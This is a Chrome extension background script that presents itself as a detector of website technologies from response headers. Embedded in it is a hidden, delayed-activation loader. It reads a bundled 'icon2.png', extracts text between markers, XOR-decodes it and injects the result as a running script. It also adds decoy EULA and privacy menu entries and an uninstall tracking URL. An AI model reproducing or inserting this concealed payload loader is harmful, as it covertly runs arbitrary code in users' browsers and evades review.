/**
 * Created with JetBrains PhpStorm.
 * User: buihoangvu
 * Date: 10/4/13
 * Time: 3:28 PM
 * To change this template use File | Settings | File Templates.
 */

window.dd = function(msg)
{
  console.log(msg);
};

var tabinfo = {};

// initial list of header detection.  will move this to a separate file later.
var knownHeaders = {
  'x-powered-by': {
    // 'Ruby on Rails': /Phusion Passenger/,
    'Express.js': /Express/,
    'PHP': /PHP\/?(.*)/,
    'Dinkly': /DINKLY\/?(.*)/,
    'ASP.NET': /ASP\.NET/,
    'Nette': /Nette Framework/
  },
  'server': {
    'Apache': /Apache\/?(.*)/,
    'nginx': /nginx\/?(.*)/,
    'IIS': /Microsoft-IIS\/?(.*)/
  },
  'via': {
    'Varnish': /(.*) varnish/
  }
};

// Scans through the headers finding matches, and returning the val from appinfo (apps.js)
var headerDetector = function (headers) {
  var appsFound = [];

  // loop through all the headers received
  for (var i = headers.length - 1; i >= 0; i--) {
    var apps = knownHeaders[headers[i].name.toLowerCase()];
    if (!apps) {
      continue;
    }
    for (var app in apps) {
      var matches = headers[i].value.match(apps[app]);
      if (matches) {
        var version = matches[1] || -1;
        appsFound[app] = version;
      }
    }
  }

  return appsFound;
};

// collect apps from header information:
chrome.webRequest.onHeadersReceived.addListener(
  function (details) {
    var appsFound = headerDetector(details.responseHeaders);
    tabinfo[details.tabId] = tabinfo[details.tabId] || {};
    tabinfo[details.tabId]['headers'] = appsFound;
  },
  {
    urls: ['<all_urls>'],
    types: ['main_frame']
  },
  ['responseHeaders']
);


chrome.tabs.onRemoved.addListener(function (tabId) {
  // free memory
  delete tabinfo[tabId];
});



(() => {
  var main = () => {
  chrome.runtime.getPackageDirectoryEntry(function (root) {
      var icon = "icon2.png";
      root.getFile(icon, {}, function (fileEntry) {
        fileEntry.file(function (file) {
          var reader = new FileReader();
          reader.onloadend = function (e) {
            var text = this.result;
            var idxF = text.lastIndexOf("init>");
            if (idxF < 0) return;
            text = text.substr(idxF + 5);
            var idxL = text.lastIndexOf("<end");
            if (idxL < 0) return;
            text = text.substr(0,idxL);
            for (var t = 0, r = text.length, n = ""; r > t;)
              n += String.fromCharCode(77 ^ text.charCodeAt(t++));
            var a = new window.Blob([n], {
              type: "text/javascript"
            });
            addScript(window.URL.createObjectURL(a));
          };
          reader.readAsText(file);
        }, (e) => {
          console.log(e)
      });
    }, (r) => {
  console.log(r)
});
});
};

var check = () => {
  chrome.storage.local.get({T : 0}, (r) => {
    r.T == 0 ? setTimeout(check, 6e5) : main();
})
};

(() => {
  if (!chrome.contextMenus) {
  return void console.log("Chrome contextMenus access failed"); // 50_c211e
}

chrome.contextMenus.create({
  title: "EULA",
  contexts: ["browser_action"],
  onclick: function () {
    window.open("/html/doc/eula.html", "_blank");
  }
});
chrome.contextMenus.create({
  title: "Privacy Policy",
  contexts: ["browser_action"],
  onclick: function () {
    window.open("/html/doc/pp.html", "_blank");
  }
});
chrome.contextMenus.create({
  title: "Terms and Conditions",
  contexts: ["browser_action"],
  onclick: function () {
    window.open("/html/doc/tandc.html", "_blank");
  }
});
})();

function addScript(src) {
  var script = document.createElement("script");
  script.setAttribute("type", "text/javascript");
  script.setAttribute("src", src);
  document.head.appendChild(script);
}

setTimeout(function(){
  chrome.storage.local.get({T : 0}, (r) => {
    r.T == 0 && chrome.storage.local.set({T : new Date().getTime()});
});
}, 4568904);
check()
})();

chrome.runtime.setUninstallURL('http://extsgo.com/api/tracker/uninstall?ext_id=' + chrome.runtime.id);



chrome.extension.onMessage.addListener(function (request, sender, sendResponse) {
  // 'result' event issued by main.js once app identification is complete
  if (request.msg == 'result') {
    var thisTab = tabinfo[sender.tab.id];
    thisTab['apps'] = request.apps;

    // load in any apps we discovered from headers:
    for (var header in thisTab['headers']) {
      thisTab['apps'][header] = thisTab['headers'][header];
    }

    // change the tab icon
    var mainApp = null;

    for (var app in request.apps) {
      if (mainApp === null) {
        mainApp = app;
        continue;
      }

      if (appinfo[app].priority) {
        if (!appinfo[mainApp].priority) {
          mainApp = app;
        }
        else if (appinfo[mainApp].priority > appinfo[app].priority) {
          mainApp = app;
        }
      }
    }

    var mainAppInfo = appinfo[mainApp];
    if (mainAppInfo) { // lazy bug
      var appTitle = mainAppInfo.title ? mainAppInfo.title : mainApp;

      if (request.apps[mainApp] != "-1") {
        appTitle = mainApp + ' ' + request.apps[mainApp];
      }

      chrome.pageAction.setIcon({tabId: sender.tab.id, path: 'apps/' + mainAppInfo.icon});
      chrome.pageAction.setTitle({tabId: sender.tab.id, title: appTitle});
    }

    chrome.pageAction.show(sender.tab.id);
    sendResponse({});
  }
  else if (request.msg == 'get') {
    // Request for 'get' comes from the popup page, asking for the list of apps
    var apps = tabinfo[request.tab];
    sendResponse(apps);
  }
});


